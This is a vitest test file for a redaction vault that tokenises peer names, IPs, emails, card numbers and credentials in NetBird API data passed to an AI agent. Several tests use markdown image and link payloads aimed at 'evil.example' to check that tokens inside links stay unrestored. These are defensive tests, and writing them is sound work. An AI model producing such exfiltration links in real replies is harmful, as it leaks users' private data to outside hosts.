import { describe, expect, test, vi } from "vitest";
import { buildPageContextMarker } from "./contract";
import { readNetbirdApi } from "./reads";
import { redactPageContext, redactResult, restoreToolInput, TOKEN_PATTERN, Vault } from "./vault";

const PEERS = [
  {
    id: "d1mo4ug6lnn4g9hqv7p0",
    name: "alice-laptop",
    hostname: "alice-laptop",
    ip: "100.64.0.10",
    connection_ip: "203.0.113.7",
    os: "macOS 15.4",
    connected: true,
    groups: [{ id: "g-dev", name: "Developers", peers_count: 2 }],
    // Not in the peer profile, so it must never leave the browser.
    meta: { secret_field: "do-not-send" },
  },
];

const peersRead = async (vault: Vault) => {
  const outcome = await readNetbirdApi({ operation: "get_api_peers" }, async () => ({ ok: true, body: PEERS }));
  return redactResult(vault, "netbird_api", outcome.content);
};

describe("vault", () => {
  test("a read leaves the browser with names tokenised, ids as they are, cut to its profile", async () => {
    const sent = await peersRead(new Vault());
    expect(sent).not.toContain("alice-laptop");
    expect(sent).not.toContain("100.64.0.10");
    expect(sent).not.toContain("203.0.113.7");
    expect(sent).not.toContain("do-not-send");
    expect(sent).toContain("d1mo4ug6lnn4g9hqv7p0");
    expect(sent).toContain("Developers");
    expect(sent).toContain("macOS 15.4");
  });

  test("a name the user types becomes the token a read gave it", async () => {
    const vault = new Vault();
    const sent = JSON.parse(await peersRead(vault));
    const name = sent.data[0].name as string;
    expect(name).toMatch(/^\[PEER_[a-z2-7]{6,}\]$/);
    expect(sent.data[0].hostname).toBe(name);
    expect(vault.scrub("why is alice-laptop offline?")).toBe(`why is ${name} offline?`);
    expect(vault.scrub("who has 203.0.113.7")).toBe(`who has ${sent.data[0].connection_ip}`);
    expect(vault.scrub("and bob-desktop?")).toBe("and bob-desktop?");
  });

  test("tokens restore to names, for people and tools alike", async () => {
    const vault = new Vault();
    const sent = JSON.parse(await peersRead(vault));
    const name = sent.data[0].name as string;
    expect(vault.restoreText(`${name} connects from ${sent.data[0].connection_ip}`)).toBe(
      "alice-laptop connects from 203.0.113.7",
    );
    expect(restoreToolInput(vault, "netbird_api", { operation: "get_api_peers", query: { name } })).toEqual({
      operation: "get_api_peers",
      query: { name: "alice-laptop" },
    });
    expect(restoreToolInput(vault, "netbird_api", { operation: "get_api_peers_peerId", id: "d1mo4ug6lnn4g9hqv7p0" })).toEqual({
      operation: "get_api_peers_peerId",
      id: "d1mo4ug6lnn4g9hqv7p0",
    });
  });

  test("a token inside a link is not restored", async () => {
    const vault = new Vault();
    const sent = JSON.parse(await peersRead(vault));
    const ip = sent.data[0].ip as string;
    expect(vault.restoreText(`![x](https://evil.example/?q=${ip}) and ${ip}`)).toBe(
      `![x](https://evil.example/?q=${ip}) and 100.64.0.10`,
    );
  });

  test("a token stays a token in every markdown link destination, not only a bare URL", async () => {
    const vault = new Vault();
    const sent = JSON.parse(await peersRead(vault));
    const name = sent.data[0].name as string;
    expect(vault.restoreText(`[docs](<https://docs.netbird.io/a b${name}>) then ${name}`)).toBe(
      `[docs](<https://docs.netbird.io/a b${name}>) then alice-laptop`,
    );
    expect(vault.restoreText(`see [r] and ${name}\n\n[r]: /peers?search=${name}`)).toBe(
      `see [r] and alice-laptop\n\n[r]: /peers?search=${name}`,
    );
    expect(vault.restoreText(`<https://netbird.io/?u=${name}> and ${name}`)).toBe(`<https://netbird.io/?u=${name}> and alice-laptop`);
  });

  test("a blank that markdown does not read as a space does not hide a link destination", async () => {
    const vault = new Vault();
    const sent = JSON.parse(await peersRead(vault));
    const name = sent.data[0].name as string;
    for (const blank of ["\u00a0", "\u2028", "\u3000", "\u2009"]) {
      expect(vault.restoreText(`[x](https://docs.netbird.io/?q=${blank}${name}) and ${name}`)).toBe(
        `[x](https://docs.netbird.io/?q=${blank}${name}) and alice-laptop`,
      );
    }
    expect(vault.restoreText(`The peer\u00a0${name} is offline.`)).toBe("The peer\u00a0alice-laptop is offline.");
  });

  test("a destination on the line after `](` or `[label]:` is still a destination", async () => {
    const vault = new Vault();
    const sent = JSON.parse(await peersRead(vault));
    const name = sent.data[0].name as string;
    expect(vault.restoreText(`[x](\n//evil.example/?q=${name}) and ${name}`)).toBe(`[x](\n//evil.example/?q=${name}) and alice-laptop`);
    expect(vault.restoreText(`![x](\n  /peers?search=${name})`)).toBe(`![x](\n  /peers?search=${name})`);
    expect(vault.restoreText(`see [r]\n\n[r]:\n//evil.example/?q=${name}`)).toBe(`see [r]\n\n[r]:\n//evil.example/?q=${name}`);
    expect(vault.restoreText(`See https://docs.netbird.io/peers\n${name} is offline.`)).toBe(
      "See https://docs.netbird.io/peers\nalice-laptop is offline.",
    );
    expect(vault.restoreText(`Open [the docs](https://docs.netbird.io)\n${name} is offline.`)).toBe(
      "Open [the docs](https://docs.netbird.io)\nalice-laptop is offline.",
    );
    expect(vault.restoreText(`[x](\n/peers "${name}")`)).toBe(`[x](\n/peers "alice-laptop")`);
  });

  test("a credential is never restored", () => {
    const vault = new Vault();
    const scrubbed = vault.scrub("my key is nbp_abcdefghijklmnopqrstuvwxyz0123456789");
    expect(scrubbed).not.toContain("nbp_");
    expect(vault.restoreText(scrubbed)).toBe("my key is [redacted credential]");
    expect(vault.restoreString(scrubbed, "real")).toBe(scrubbed);
  });

  test("a stream holds back a token it has not finished", async () => {
    const vault = new Vault();
    const sent = JSON.parse(await peersRead(vault));
    const token = sent.data[0].name as string;
    expect(vault.restoreStreamingText(`It is ${token.slice(0, 7)}`)).toBe("It is ");
    expect(vault.restoreStreamingText(`It is ${token}`)).toBe("It is alice-laptop");
  });

  test("the page marker keeps the id and tokenises a peer's name", async () => {
    const vault = new Vault();
    const sent = JSON.parse(await peersRead(vault));
    const marker = redactPageContext(
      vault,
      buildPageContextMarker({ kind: "peer", ref: "d1mo4ug6lnn4g9hqv7p0", label: "alice-laptop" }),
    );
    expect(marker).toBe(`<page-context kind="peer" ref="d1mo4ug6lnn4g9hqv7p0" label="${sent.data[0].name}" />`);
    const group = redactPageContext(vault, buildPageContextMarker({ kind: "group", ref: "g-dev", label: "Developers" }));
    expect(group).toBe(`<page-context kind="group" ref="g-dev" label="Developers" />`);
  });

  test("tokens match the agent's pattern", async () => {
    const sent = await peersRead(new Vault());
    expect(sent.match(TOKEN_PATTERN)?.length).toBeGreaterThan(3);
  });

  const USERS = [
    { id: "u1", name: "admin", email: "root@acme.test", role: "admin", status: "active" },
    { id: "u2", name: "Bob Builder", email: "bob@acme.test", role: "admin", status: "active" },
  ];

  const read = async (vault: Vault, operation: string, body: unknown, query: Record<string, string> = {}) => {
    const outcome = await readNetbirdApi({ operation, query }, async () => ({ ok: true, body }));
    return JSON.parse(redactResult(vault, "netbird_api", outcome.content));
  };

  test("a peer or user named like a platform or a role does not rewrite those fields", async () => {
    const vault = new Vault();
    const peers = await read(vault, "get_api_peers", [
      { id: "p0", name: "linux", hostname: "linux", os: "Linux", connected: true },
      { id: "p1", name: "build-box", hostname: "build-box", os: "Linux", connected: true },
    ]);
    expect(peers.data.map((p: { os: string }) => p.os)).toEqual(["Linux", "Linux"]);
    const counted = await read(vault, "get_api_peers", [{ id: "p1", name: "build-box", os: "Linux" }], { count_by: "os" });
    expect(counted.counts).toEqual([{ os: "Linux", count: 1 }]);
    const users = await read(vault, "get_api_users", USERS);
    expect(users.data.map((u: { role: string }) => u.role)).toEqual(["admin", "admin"]);
    expect(users.data[0].name).toMatch(/^\[USER_/);
  });

  test("a name does not rewrite the notes a read explains itself with", async () => {
    const vault = new Vault();
    vault.mint("peer", "search");
    vault.mint("peer", "nothing");
    const sent = await read(vault, "get_api_peers", PEERS, { search: "zzzzzz" });
    expect(sent.note).toBe("Nothing matched the search; try fewer or different words.");
  });

  test("free text and typed text still have known names replaced", async () => {
    const vault = new Vault();
    const peers = JSON.parse(await peersRead(vault));
    const name = peers.data[0].name as string;
    const groups = await read(vault, "get_api_groups", [{ id: "g1", name: "Team of alice-laptop", peers_count: 1 }]);
    expect(groups.data[0].name).toBe(`Team of ${name}`);
    const networks = await read(vault, "get_api_networks", [{ id: "n1", name: "office", description: "reached through ALICE-LAPTOP" }]);
    expect(networks.data[0].description).toBe(`reached through ${name}`);
    expect(vault.scrub("is Alice-Laptop online?")).toBe(`is ${name} online?`);
  });

  test("a field read before the row that names a peer is still scrubbed against it", async () => {
    const vault = new Vault();
    const sent = await read(vault, "get_api_groups", [
      { id: "g1", name: "Owners of zed-laptop", peers: [{ id: "p9", name: "zed-laptop" }] },
    ]);
    expect(JSON.stringify(sent)).not.toContain("zed-laptop");
  });

  test("an address in a closed-vocabulary field is still tokenised", async () => {
    const sent = await read(new Vault(), "get_api_peers", [{ id: "p1", name: "build-box", os: "Linux 10.20.30.40" }]);
    expect(sent.data[0].os).toMatch(/^Linux \[IP_[a-z2-7]+\]$/);
  });

  const uuid = (i: number) => `${i.toString(16).padStart(8, "0")}-1111-4222-8333-${(i * 7919).toString(16).padStart(12, "0")}`;

  const compilesWhile = <T,>(run: () => T): [T, number] => {
    const compiled = vi.spyOn(globalThis, "RegExp");
    try {
      return [run(), compiled.mock.calls.length];
    } finally {
      compiled.mockRestore();
    }
  };

  test("a large read compiles the known-name pattern once, whatever shape its values have", async () => {
    const peers = Array.from({ length: 1_000 }, (_, i) => ({
      id: `p${i}`,
      name: `peer-${i}`,
      hostname: `host-${i}.internal`,
      ip: `100.64.${Math.floor(i / 250)}.${i % 250}`,
      os: "Linux",
      version: "0.60.1",
      connected: true,
      user_id: uuid(i),
      groups: [{ id: "g-all", name: "All" }],
    }));
    const outcome = await readNetbirdApi({ operation: "get_api_peers" }, async () => ({ ok: true, body: peers }));
    const [sent, compiles] = compilesWhile(() => redactResult(new Vault(), "netbird_api", outcome.content));
    expect(JSON.parse(sent).data).toHaveLength(1_000);
    expect(sent).not.toContain("peer-999");
    expect(compiles).toBeLessThanOrEqual(2);
  });

  test("an address or an id found in free text does not recompile the pattern, and keeps one token", async () => {
    const networks = Array.from({ length: 1_000 }, (_, i) => ({
      id: `n${i}`,
      name: `office-${i}`,
      description: `gateway 10.${Math.floor(i / 250)}.${i % 250}.1, ticket ${uuid(i)}, owner owner-${i}@acme.test`,
    }));
    const outcome = await readNetbirdApi({ operation: "get_api_networks" }, async () => ({ ok: true, body: networks }));
    const vault = new Vault();
    vault.mint("peer", "alice-laptop");
    const [sent, compiles] = compilesWhile(() => redactResult(vault, "netbird_api", outcome.content));
    expect(compiles).toBeLessThanOrEqual(2);
    expect(sent).not.toContain("10.3.249.1");
    expect(sent).not.toContain("@acme.test");
    expect(sent).not.toContain(uuid(999));
    const description = JSON.parse(sent).data[7].description as string;
    expect(vault.scrub(networks[7].description)).toBe(description);
    expect(vault.restoreString(description, "real")).toBe(networks[7].description);
    expect(vault.restoreText(description)).toBe(networks[7].description);
  });

  test("page after page of traffic events compiles the pattern once for the whole chat", async () => {
    const vault = new Vault();
    let compiles = 0;
    for (let page = 1; page <= 5; page++) {
      const rows = Array.from({ length: 1_000 }, (_, i) => ({
        flow_id: uuid(page * 1_000 + i),
        reporter_id: `p${i % 50}`,
        protocol: 6,
        direction: "INGRESS",
        source: { id: `p${i % 50}`, type: "PEER", name: `peer-${i % 50}`, address: `100.64.0.${i % 50}:443` },
        destination: { id: `r${i % 20}`, type: "HOST_RESOURCE", name: `res-${i % 20}`, address: `10.0.${i % 20}.1:22` },
        events: [{ type: "TYPE_START", timestamp: "2026-11-17T10:00:00Z" }],
      }));
      const body = { page, page_size: 1_000, total_records: 5_000, total_pages: 5, data: rows };
      const outcome = await readNetbirdApi(
        { operation: "get_api_events_network_traffic", query: { page, page_size: 1_000 } },
        async () => ({ ok: true, body }),
      );
      const [sent, compiled] = compilesWhile(() => redactResult(vault, "netbird_api", outcome.content));
      compiles += compiled;
      expect(JSON.parse(sent).data.data).toHaveLength(1_000);
      expect(sent).not.toContain("peer-49");
      expect(sent).not.toContain("100.64.0.49");
    }
    expect(compiles).toBeLessThanOrEqual(2);
  });

  test("a reference to a record reads as that record's own id, so the model can join the two", async () => {
    const vault = new Vault();
    const owner = "3f9c1e2a-7b4d-4e8f-9a0b-1c2d3e4f5a6b";
    const users = await read(vault, "get_api_users", [{ id: owner, name: "Anna Schmidt", role: "user" }]);
    const peers = await read(vault, "get_api_peers", [{ id: "p1", name: "anna-mbp", user_id: owner }]);
    const listed = await readNetbirdApi({ operation: "get_api_users_userId_tokens", id: owner }, async () => ({
      ok: true,
      body: [{ id: "t1", name: "ci", created_by: owner }],
    }));
    const tokens = JSON.parse(redactResult(vault, "netbird_api", listed.content));
    const id = users.data[0].id as string;
    expect(id).toMatch(/^\[UUID_[a-z2-7]+\]$/);
    expect(peers.data[0].user_id).toBe(id);
    expect(tokens.data[0].created_by).toBe(id);
    expect(restoreToolInput(vault, "netbird_api", { operation: "get_api_users_userId_tokens", id })).toEqual({
      operation: "get_api_users_userId_tokens",
      id: owner,
    });
  });

  test("a record's own id that is an email or an address is tokenised, the same as a reference to it", async () => {
    const vault = new Vault();
    const users = await read(vault, "get_api_users", [
      { id: "bob@acme.test", name: "Bob Stone", email: "bob@acme.test" },
      { id: "10.20.30.40", name: "Service" },
      { id: "google-oauth2|113331070247434659044", name: "Anna Schmidt" },
      { id: "u4", name: "Li Wei" },
    ]);
    expect(users.data[0].id).toMatch(/^\[EMAIL_[a-z2-7]+\]$/);
    expect(users.data[0].id).toBe(users.data[0].email);
    expect(users.data[1].id).toMatch(/^\[IP_[a-z2-7]+\]$/);
    expect(users.data[2].id).toBe("google-oauth2|113331070247434659044");
    expect(users.data[3].id).toBe("u4");
    const peers = await read(vault, "get_api_peers", [{ id: "p1", name: "bob-mbp", user_id: "bob@acme.test" }]);
    expect(peers.data[0].user_id).toBe(users.data[0].id);
    expect(restoreToolInput(vault, "netbird_api", { operation: "get_api_users_userId_tokens", id: users.data[0].id })).toEqual({
      operation: "get_api_users_userId_tokens",
      id: "bob@acme.test",
    });
  });

  test("a record given by its id alone is scrubbed as its own id would be", async () => {
    const vault = new Vault();
    const policies = await read(vault, "get_api_policies", [
      { id: "pol1", name: "Default", rules: [{ id: "r1", name: "Default", sources: ["g1", "bob@acme.test"], destinations: ["g1"] }] },
    ]);
    expect(policies.data[0].rules[0].sources[0]).toBe("g1");
    expect(policies.data[0].rules[0].sources[1]).toMatch(/^\[EMAIL_[a-z2-7]+\]$/);
    expect(policies.data[0].rules[0].destinations).toEqual(["g1"]);
  });

  test("a card next to other digits is caught the first time it is seen", () => {
    const vault = new Vault();
    const card = vault.scrub("4111111111111111");
    expect(card).toMatch(/^\[CARD_[a-z2-7]+\]$/);
    expect(new Vault().scrub("pay 4111111111111111 12 now")).toMatch(/^pay \[CARD_[a-z2-7]+\] 12 now$/);
    expect(vault.scrub("4111111111111111 12")).toBe(`${card} 12`);
    expect(vault.scrub("charge 4111111111111111 03/27")).toBe(`charge ${card} 03/27`);
    expect(vault.scrub("ref 12 4111111111111111 03")).toBe(`ref 12 ${card} 03`);
    expect(new Vault().scrub("4111 1111 1111 1111 12/27")).toMatch(/^\[CARD_[a-z2-7]+\] 12\/27$/);
    expect(vault.scrub("order 1234567890123456 12")).toBe("order 1234567890123456 12");
  });

  test("an id field holding an email or an address is still tokenised", async () => {
    const sent = await read(new Vault(), "get_api_peers", [
      { id: "p1", name: "anna-mbp", user_id: "anna@acme.test" },
      { id: "p2", name: "bob-mbp", user_id: "10.20.30.40" },
    ]);
    expect(sent.data[0].user_id).toMatch(/^\[EMAIL_[a-z2-7]+\]$/);
    expect(sent.data[1].user_id).toMatch(/^\[IP_[a-z2-7]+\]$/);
  });

  test("a name does not rewrite a provider, a date or the audit note", async () => {
    const vault = new Vault();
    vault.mint("user", "Claude");
    for (const name of ["okta", "team", "2026", "target", "newest", "network"]) vault.mint("peer", name);
    const log = { id: "l1", model: "gpt-4o", provider: "okta", timestamp: "2026-11-17T10:00:00Z" };
    const logs = await read(vault, "get_api_agent_network_access_logs", { page: 1, page_size: 1, total_records: 1, total_pages: 1, data: [log] });
    expect(logs.data.data[0]).toEqual(log);
    const idp = await read(vault, "get_api_integrations_okta_scim_idp", [{ id: 1, provider: "okta" }]);
    expect(idp.data[0].provider).toBe("okta");
    const note = "Newest rows only — narrow with target, activity or initiator to see the rest.";
    const audit = JSON.parse(redactResult(vault, "audit_events", JSON.stringify({ window_days: 7, matched: 60, shown: 50, note, rows: [] })));
    expect(audit.note).toBe(note);
    const networks = await read(vault, "get_api_networks", [{ id: "n1", name: "office", description: "owned by Claude" }]);
    expect(networks.data[0].description).toMatch(/^owned by \[USER_/);
  });

  test("a model is whatever a client or an admin wrote, so a name in it is tokenised", async () => {
    const vault = new Vault();
    const name = vault.mint("peer", "alice-laptop");
    const page = (data: unknown[]) => ({ page: 1, page_size: 1, total_records: 1, total_pages: 1, data });
    const logs = await read(vault, "get_api_agent_network_access_logs", page([{ id: "l1", model: "alice-laptop-gpt4", provider: "azure" }]));
    expect(logs.data.data[0].model).toBe(`${name}-gpt4`);
    const sessions = await read(vault, "get_api_agent_network_access_log_sessions", page([{ session_id: "s1", models: ["alice-laptop-gpt4"] }]));
    expect(sessions.data.data[0].models).toEqual([`${name}-gpt4`]);
    const providers = await read(vault, "get_api_agent_network_providers", [{ id: "pr1", name: "main", models: [{ id: "alice-laptop-gpt4" }] }]);
    expect(providers.data[0].models[0].id).toBe(`${name}-gpt4`);
    const guardrails = await read(vault, "get_api_agent_network_guardrails", [
      { id: "gr1", name: "strict", checks: { model_allowlist: { enabled: true, models: ["alice-laptop-gpt4", "gpt-4o"] } } },
    ]);
    expect(guardrails.data[0].checks.model_allowlist.models).toEqual([`${name}-gpt4`, "gpt-4o"]);
  });

  test("a session id is the client's own, so it is always a token, the same in an entry and its session", async () => {
    const vault = new Vault();
    const id = "019eeb72-ab7c-7cd2-aa05-6e8eb834afcb";
    const page = (data: unknown[]) => ({ page: 1, page_size: 1, total_records: 1, total_pages: 1, data });
    const logs = await read(vault, "get_api_agent_network_access_logs", page([{ id: "l1", session_id: id }, { id: "l2", session_id: "anna-thread" }]));
    const sessions = await read(vault, "get_api_agent_network_access_log_sessions", page([{ session_id: id, entries: [{ id: "l1", session_id: id }] }]));
    expect(JSON.stringify([logs, sessions])).not.toContain(id);
    expect(logs.data.data[0].session_id).toMatch(/^\[SESSION_[a-z2-7]+\]$/);
    expect(logs.data.data[1].session_id).toMatch(/^\[SESSION_[a-z2-7]+\]$/);
    expect(sessions.data.data[0].session_id).toBe(logs.data.data[0].session_id);
    expect(sessions.data.data[0].entries[0].session_id).toBe(logs.data.data[0].session_id);
  });

  test("a session id that is a credential is never restored", async () => {
    const vault = new Vault();
    const jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghijk";
    const page = { page: 1, page_size: 1, total_records: 1, total_pages: 1, data: [{ id: "l1", session_id: jwt }] };
    const token = (await read(vault, "get_api_agent_network_access_logs", page)).data.data[0].session_id as string;
    expect(token).toMatch(/^\[KEY_[a-z2-7]+\]$/);
    expect(vault.restoreString(token, "real")).toBe(token);
    expect(vault.restoreText(token)).toBe("[redacted credential]");
  });

  test("a name whose lower case is not its own length is still found in typed text", () => {
    const vault = new Vault();
    const token = vault.mint("user", "İbrahim Kaya");
    expect(vault.scrub("is İbrahim Kaya an admin?")).toBe(`is ${token} an admin?`);
    const other = vault.mint("user", "Jörg STRASSER");
    expect(vault.scrub("and jörg strasser?")).toBe(`and ${other}?`);
  });

  test("a short name stays a word in free text, and becomes its token again where a tool gives it back", () => {
    const vault = new Vault();
    const token = vault.mint("user", "Li");
    expect(vault.scrub("Li is away")).toBe("Li is away");
    expect(vault.scrubEcho("Li")).toBe(token);
    expect(vault.scrubEcho(" Li ")).toBe(token);
    expect(vault.scrubEcho("Lin")).toBe("Lin");
  });

  test("an envelope key carries text or a number, never rows", () => {
    const vault = new Vault();
    const nested = { operation: "zzz", error: { data: [{ name: "alice-laptop" }] }, note: ["alice-laptop"], status: 500 };
    expect(JSON.parse(redactResult(vault, "netbird_api", JSON.stringify(nested)))).toEqual({ status: 500 });
    const profiled = { operation: "get_api_peers", error: { name: "alice-laptop" }, statusText: ["alice-laptop"], status: 403 };
    expect(JSON.parse(redactResult(vault, "netbird_api", JSON.stringify(profiled)))).toEqual({ operation: "get_api_peers", status: 403 });
  });
});
